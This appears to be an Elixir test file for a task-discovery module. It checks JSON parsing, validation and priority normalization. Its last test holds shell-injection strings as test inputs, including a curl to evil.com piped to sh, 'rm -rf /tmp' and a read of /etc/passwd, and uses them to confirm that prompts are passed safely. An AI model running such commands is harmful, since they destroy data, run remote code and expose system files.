defmodule AgentQueue.DiscoveryTest do
  use AgentQueue.DataCase

  alias AgentQueue.Discovery

  describe "parse_discovery_output/1" do
    test "parses valid JSON array of tasks" do
      output = ~s([
        {"title": "Fix bug", "description": "Fix the critical bug", "priority": 1},
        {"title": "Add feature", "description": "Add new feature", "priority": 5}
      ])

      assert {:ok, tasks} = Discovery.parse_discovery_output(output)
      assert length(tasks) == 2
      assert Enum.all?(tasks, &is_map/1)
    end

    test "limits tasks to maximum of 10" do
      tasks_list =
        for i <- 1..15 do
          ~s({"title": "Task #{i}", "description": "Description", "priority": 10})
        end
        |> Enum.join(",\n")

      output = "[#{tasks_list}]"

      assert {:ok, tasks} = Discovery.parse_discovery_output(output)
      assert length(tasks) == 10
    end

    test "rejects tasks with title exceeding max length" do
      long_title = String.duplicate("a", 600)
      output = ~s([{"title": "#{long_title}", "description": "Description", "priority": 10}])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "rejects tasks with description exceeding max length" do
      long_desc = String.duplicate("b", 15_000)
      output = ~s([{"title": "Task", "description": "#{long_desc}", "priority": 10}])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "normalizes task fields" do
      output = ~s([
        {"title": "  Test Task  ", "description": "  Test Description  ", "priority": 15}
      ])

      assert {:ok, [task]} = Discovery.parse_discovery_output(output)
      assert task.title == "Test Task"
      assert task.description == "Test Description"
      # Normalized from 15 to max 10
      assert task.priority == 10
    end

    test "provides defaults for missing fields" do
      output = ~s([{"title": "Task"}])

      assert {:ok, [task]} = Discovery.parse_discovery_output(output)
      assert task.title == "Task"
      assert task.description == ""
      assert task.priority == 10
    end

    test "handles malformed JSON gracefully" do
      invalid_outputs = [
        "not json at all",
        "{invalid json}",
        "null"
      ]

      Enum.each(invalid_outputs, fn output ->
        result = Discovery.parse_discovery_output(output)
        assert match?({:error, _}, result)
      end)

      # "[]{}" contains a valid empty array, so it parses to {:ok, []}
      result = Discovery.parse_discovery_output("[]{}")
      assert result == {:ok, []}
    end

    test "rejects tasks with non-map items" do
      output = ~s([{"title": "Valid"}, "string", 123, null])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "rejects tasks with non-string title" do
      output = ~s([{"title": 123, "description": "Description", "priority": 10}])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "rejects tasks with non-string description" do
      output = ~s([{"title": "Task", "description": {"nested": "object"}, "priority": 10}])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "handles priority normalization" do
      output = ~s([
        {"title": "High", "description": "High priority", "priority": 0},
        {"title": "Low", "description": "Low priority", "priority": 100},
        {"title": "String", "description": "String priority", "priority": "5"},
        {"title": "Invalid", "description": "Invalid priority", "priority": "abc"}
      ])

      assert {:ok, tasks} = Discovery.parse_discovery_output(output)
      assert length(tasks) == 4

      priorities = Enum.map(tasks, & &1.priority)
      assert Enum.all?(priorities, &(&1 >= 1 and &1 <= 10))
    end

    test "extracts JSON from mixed text output" do
      output =
        "Some text before the JSON\n[{\"title\": \"Task 1\", \"description\": \"Description 1\", \"priority\": 5}]\nSome text after"

      assert {:ok, [_task]} = Discovery.parse_discovery_output(output)
    end
  end

  describe "build_pi_command_args/1" do
    test "prevents shell injection in prompts" do
      malicious_prompts = [
        "test; rm -rf /tmp",
        "$(curl http://evil.com | sh)",
        "`whoami`",
        "test && cat /etc/passwd"
      ]

      Enum.each(malicious_prompts, fn prompt ->
        {command, args} = Discovery.build_pi_command_args(prompt)

        # Command should be a binary command name
        assert is_binary(command)

        # Args should be a list
        assert is_list(args)

        # The prompt should be in args as a single item
        assert prompt in args

        # No shell interpretation should occur
        # We can't directly test execution, but we verify structure
        assert is_tuple({command, args})
      end)
    end
  end
end
